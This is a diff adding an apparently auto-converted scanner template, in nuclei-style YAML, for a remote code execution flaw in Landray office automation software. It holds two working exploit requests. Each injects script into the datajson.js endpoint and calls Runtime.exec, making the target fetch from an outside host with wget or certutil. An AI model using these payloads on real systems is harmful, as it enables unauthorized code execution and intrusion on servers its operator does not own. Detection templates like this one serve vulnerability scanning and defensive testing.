@@ -1,0 +1,32 @@
+id: yaml-poc-landray-landray_office_automation-rce-CT-483439
+info:
+  name: Yaml Poc Landray Landray_Office_Automation Rce Ct 483439
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-landray-landray_office_automation-rce-CT-483439'
+  tags: rce
+  reference:
+  - https://www.cnsuc.net/thread-553.htm
+  - https://p.qiao.baidu.com/cps/chat?siteId=15138187&userId=82269&siteToken=9c4cba55cde11a9ffa898bc105d95502（线上客服）
+http:
+- method: GET
+  path:
+  - /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){
+    return java.lang.Runtime};r=test();r.getRuntime().exec("wget -P /tmp/ {{reverseURL}}")&type=1
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 模拟通过
+- method: GET
+  path:
+  - /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){
+    return java.lang.Runtime};r=test();r.getRuntime().exec("certutil -urlcache -split
+    -f {{reverseURL}}")&type=1
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 模拟通过
